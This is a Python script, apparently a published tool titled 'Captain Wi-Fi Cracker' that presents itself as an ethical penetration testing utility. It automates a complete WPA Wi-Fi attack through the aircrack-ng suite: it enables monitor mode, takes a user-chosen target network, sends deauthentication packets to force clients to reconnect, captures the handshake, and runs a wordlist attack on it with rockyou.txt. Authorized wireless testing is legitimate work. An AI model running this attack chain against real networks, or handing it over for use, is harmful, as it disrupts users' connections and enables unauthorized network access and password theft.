import subprocess
import re
import os
import time
import shutil
import textwrap

def display_intro():
    ascii_art = r'''
     ____            _        _        __        ___       _____ _    ____                _              
    / ___|__ _ _ __ | |_ __ _(_)_ __   \ \      / (_)     |  ___(_)  / ___|_ __ __ _  ___| | _____ _ __  
   | |   / _` | '_ \| __/ _` | | '_ \   \ \ /\ / /| |_____| |_  | | | |   | '__/ _` |/ __| |/ / _ \ '__| 
   | |__| (_| | |_) | || (_| | | | | |   \ V  V / | |_____|  _| | | | |___| | | (_| | (__|   <  __/ |    
    \____\__,_| .__/ \__\__,_|_|_| |_|    \_/\_/  |_|     |_|   |_|  \____|_|  \__,_|\___|_|\_\___|_|    
              |_|                                                                                       
    '''
    header = """
    ####################################################################################################
    #                                       Captain Wi-Fi Cracker                                      #
    #                               Ethical WiFi Penetration Testing Tool                              #
    #                                          Author: Nandu10                                         #
    #                           LinkedIn: https://linkedin.com/in/nandu-krishna-                       #
    ####################################################################################################

                                Hacking is an art — use your skills ethically!
    """
    print(ascii_art)
    print(textwrap.dedent(header))

def get_wifi_cards():
    print("[*] Scanning for WiFi cards...")
    out = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, text=True)
    cards = re.findall(r'^(\w+)\s+IEEE 802.11', out.stdout, re.M)
    return cards

def pick_card(cards):
    print("\nAvailable WiFi Cards:")
    for i, card in enumerate(cards):
        print(f"{i}: {card}")
    while True:
        try:
            choice = int(input("Choose your WiFi card: "))
            if 0 <= choice < len(cards):
                return cards[choice]
            else:
                print("Invalid selection. Try again.")
        except ValueError:
            print("Invalid input. Enter a number.")

def start_monitor(card):
    print(f"[*] Enabling monitor mode on {card}...")
    subprocess.run(['airmon-ng', 'start', card])
    return card + "mon"

def scan_wifi(mon_card):
    print(f"[*] Starting scan on {mon_card}. Press Ctrl+C to stop.")
    try:
        subprocess.run(['airodump-ng', mon_card])
    except KeyboardInterrupt:
        print("\n[!] Scan stopped. Note down BSSID and Channel.")

def get_handshake(mon_card, bssid, ch):
    os.makedirs("handshakes", exist_ok=True)
    savefile = f"handshakes/{bssid.replace(':', '-')}"

    print("[*] Launching airodump-ng to capture handshake...")
    dump_cmd = ['airodump-ng', '-c', ch, '--bssid', bssid, '-w', savefile, mon_card]
    proc = subprocess.Popen(dump_cmd)

    time.sleep(5)
    print("[*] Sending deauth packets...")
    subprocess.run(['aireplay-ng', '--deauth', '10', '-a', bssid, mon_card])

    print("[*] Waiting for handshake (20 sec)... Press Ctrl+C to interrupt.")
    try:
        time.sleep(20)
    except KeyboardInterrupt:
        print("[!] Capture interrupted.")

    proc.terminate()
    cap_file = savefile + "-01.cap"
    print(f"[+] Capture saved to: {cap_file}")

    return cap_file

def crack_it(capfile):
    print("\nChoose a wordlist option:")
    print("1. Use default rockyou.txt")
    print("2. Enter custom path")

    while True:
        choice = input("Select [1 or 2]: ").strip()
        if choice == "1":
            if not os.path.isfile("/usr/share/wordlists/rockyou.txt"):
                if os.path.isfile("/usr/share/wordlists/rockyou.txt.gz"):
                    print("[*] Unzipping rockyou.txt.gz...")
                    subprocess.run(['gunzip', '/usr/share/wordlists/rockyou.txt.gz'])
            wordlist = "/usr/share/wordlists/rockyou.txt"
            break
        elif choice == "2":
            wordlist = input("Enter path to your custom wordlist: ").strip()
            if os.path.isfile(wordlist):
                break
            else:
                print("[-] Wordlist file not found!")
        else:
            print("Invalid choice. Try again.")

    print("[*] Cracking in progress...")
    subprocess.run(['aircrack-ng', '-w', wordlist, capfile])

def main():
    display_intro()

    cards = get_wifi_cards()
    if not cards:
        print("[-] No compatible WiFi cards found.")
        return

    card = pick_card(cards)
    mon_card = start_monitor(card)

    scan_wifi(mon_card)

    bssid = input("Enter target BSSID: ").strip()
    ch = input("Enter target channel: ").strip()

    capfile = get_handshake(mon_card, bssid, ch)

    crack_it(capfile)

if __name__ == "__main__":
    main()
